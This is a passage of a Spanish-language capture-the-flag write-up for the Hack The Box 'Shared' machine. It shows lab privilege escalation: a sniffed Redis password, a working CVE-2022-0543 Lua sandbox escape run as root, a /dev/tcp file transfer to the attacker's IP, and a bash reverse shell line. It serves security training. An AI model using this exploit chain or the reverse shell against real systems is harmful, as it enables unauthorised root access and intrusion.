redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:5863
run_id:d52b4ce0d6bdbfecb1559c3677c6bed5d4335240
tcp_port:6379
uptime_in_seconds:13
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:8971000
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
dan_smith@shared:/usr/local/bin$ 
```

![](/assets/images/htb-writeup-shared/web24.png)

Si vemos que hay referente a **redis** vemos lo siguiente

```bash
dan_smith@shared:~$ redis
redis-benchmark      redis-check-aof      redis-check-rdb      redis-cli            redis_connector_dev  redis-server
dan_smith@shared:~$ redis
```

Vamos a ir a `hacktriks` para ver como podemos enumerar este servicio <https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis>

Vamos a conectarnos usando `redis-cli`

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> 
```

En la pagina de **hacktriks** nos dicen que podemos ejecutar este comando pero aun así no nos reporta nada de información

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> INFO
NOAUTH Authentication required.
127.0.0.1:6379>
```

Si probamos con las credenciales que tenemos no funcionan

```bash
127.0.0.1:6379> AUTH james_mason Soleil101
(error) WRONGPASS invalid username-password pair
127.0.0.1:6379> 
```

Para analizarlo de mejor manero nos vamos a traer el `redis_connector_dev`

```bash
dan_smith@shared:~$ cat < /usr/local/bin/redis_connector_dev > /dev/tcp/10.10.14.12/443
```

```bash
❯ nc -nlvp 443 > redis_connector_dev
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.172] 54596

```

Bueno como no tenemos el redis instalado nos dice esto 

```bash
❯ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp [::1]:6379: connect: connection refused

```

Pero podemos usar **netcat** por que dice que se esta conectando usando una contraseña entonce podemos saber cual es la que esta usando

Nos vamos a poner en escucha en el puerto indicado

```bash
❯ nc -nlvp 6379
listening on [any] 6379 ...

```

Si lo ejecutamos pasa esto 

```bash
❯ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 i/o timeout
```

Recibimos esto 

```bash
❯ nc -nlvp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57328
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

Como tenemos la contraseña lo que podemos hacer es ahora si conectarnos desde la shell por **SSH**

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> 
```

Vamos a hacer un **INFO** pero no encontramos nada

```bash
127.0.0.1:6379> INFO
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:7040
run_id:67300873d3594ff09250da90103e350d7a91014f
tcp_port:6379
uptime_in_seconds:49
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:8973976
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:873328
used_memory_human:852.86K
used_memory_rss:15405056
used_memory_rss_human:14.69M
used_memory_peak:873328
used_memory_peak_human:852.86K
used_memory_peak_perc:100.17%
used_memory_overhead:830336
used_memory_startup:809832
used_memory_dataset:42992
used_memory_dataset_perc:67.71%
allocator_allocated:1285208
allocator_active:1605632
allocator_resident:4227072
total_system_memory:2078982144
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:320424
allocator_rss_ratio:2.63
allocator_rss_bytes:2621440
rss_overhead_ratio:3.64
rss_overhead_bytes:11177984
mem_fragmentation_ratio:18.54
mem_fragmentation_bytes:14574240
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20504
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1686695527
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:65
total_net_output_bytes:39
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:2
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:75a740cdc4946d65a450cd5dcaa3f06e50940342
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.050378
used_cpu_user:0.079765
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
127.0.0.1:6379> 
```

Bueno después de estar buscando encontré esto <https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/>

Nos dicen como ponemos inyectar un comando vamos a cambiarlo por un `whoami` primero nos autenticamos rápido por que cada ciertos segundo se desconecta y funciona 

![](/assets/images/htb-writeup-shared/web25.png)

```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0
"root\n"
127.0.0.1:6379> 
```

Podemos poner la **bash** **SUID** o enviarnos una reverse shell 

Pero bueno nos vamos a enviar la shell directamente como root

```bash
dan_smith@shared:/dev/shm$ nano reverse
dan_smith@shared:/dev/shm$ cat reverse 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.12/443 0>&1
dan_smith@shared:/dev/shm$ 
```

Ahora nos ponemos en escucha

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

```

Ahora lo ejecutamos

```bash
dan_smith@shared:/dev/shm$ redis-cli 
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/reverse", "r"); local res = f:read("*a"); f:close(); return res' 0
```

Y ganamos acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.172] 57300
bash: cannot set terminal process group (7371): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis# whoami
whoami
root
root@shared:/var/lib/redis# 
```

## Root.txt 

```bash
root@shared:~# cat root.txt 
7b9df1e3c9916667be8d156601e3551a
root@shared:~#
```
